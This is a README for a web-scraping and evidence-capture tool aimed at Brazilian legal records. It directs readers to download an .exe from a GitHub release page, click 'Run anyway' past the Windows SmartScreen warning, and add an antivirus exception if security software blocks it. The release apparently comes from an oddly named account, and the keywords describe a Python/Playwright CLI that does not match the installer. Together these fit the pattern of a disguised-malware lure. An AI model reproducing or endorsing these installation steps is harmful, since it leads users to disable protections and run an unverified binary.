# 🕸️ tarrafa_scraper - Capture digital evidence for legal records

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/filmable-sleepdisorder508/tarrafa_scraper/releases)

Tarrafa helps you collect information from the internet. It works as a tool to save web pages, videos, and social media posts. You create a permanent record of digital content for legal or research needs. It handles complex tasks like saving site data, PDF files, and specific legal records such as CNPJ and Datajud files.

## 🛠️ System requirements

Your computer needs Windows 10 or Windows 11 to run this software. You should have at least 4GB of RAM and 500MB of free storage space. Ensure you have a stable internet connection.

## 📥 How to download the software

Visit the project release page to download the latest version. Click the following link:

[https://github.com/filmable-sleepdisorder508/tarrafa_scraper/releases](https://github.com/filmable-sleepdisorder508/tarrafa_scraper/releases)

Look for the file that ends in .exe. Right-click the file and save it to your desktop or a folder you can find easily.

## ⚙️ Setting up the application

1. Open the folder where you saved the .exe file.
2. Double-click the file to start the installer.
3. Windows might show a blue box that says "Windows protected your PC." Click "More info" and then click "Run anyway" to proceed.
4. Follow the instructions on the screen to finish the installation.
5. The installer places a shortcut icon on your desktop.

## 🖱️ Using the tool

Double-click the Tarrafa icon on your desktop to open the command window. A black screen appears. This is your workspace. Type the commands that match your capture needs.

### Capturing a single page
To save a webpage, type: `tarrafa capture --url [address]`. Replace [address] with the website link you want to save. Press Enter. The tool creates a file in your user folder.

### Saving a video
To save a video, type: `tarrafa video --url [address]`. The tool scans the page and downloads the video file.

### Legal record retrieval
For specific legal searches, such as Datajud or CNPJ lookup, use the command: `tarrafa search --type [category] --id [number]`. This retrieves the document and saves a copy to your computer.

## 📁 Where do my files go?

By default, the program saves all retrieved data in a folder named `Tarrafa_Exports` inside your Windows Documents folder. You find your saved PDFs, images, and logs there. Organize these files by date or case name to keep your evidence tidy.

## 🔍 Understanding the output

- **PDF records:** The tool converts web pages into readable documents.
- **Videos:** You get a standard file in the format the website provides.
- **Logs:** The program creates a text file for every action. This text file proves when and how you captured the data. Keep these logs for your legal records.

## ⚠️ Troubleshooting common issues

If the window closes immediately, ensure you have an active internet connection. If the program fails to save a file, check if you have permission to write files to your Documents folder. Sometimes security software blocks the tool. If this happens, add an exception for the tool in your antivirus settings.

## 💡 Best practices for digital evidence

1. Always capture the full URL of the website.
2. Save both the visual snapshot and the file itself.
3. Keep the original log file from the software.
4. Back up your `Tarrafa_Exports` folder to an external drive or cloud storage.

Keywords: brazil, cli, datajud, digital-evidence, djen, legal-tech, osint, playwright, python, web-archiving, web-scraping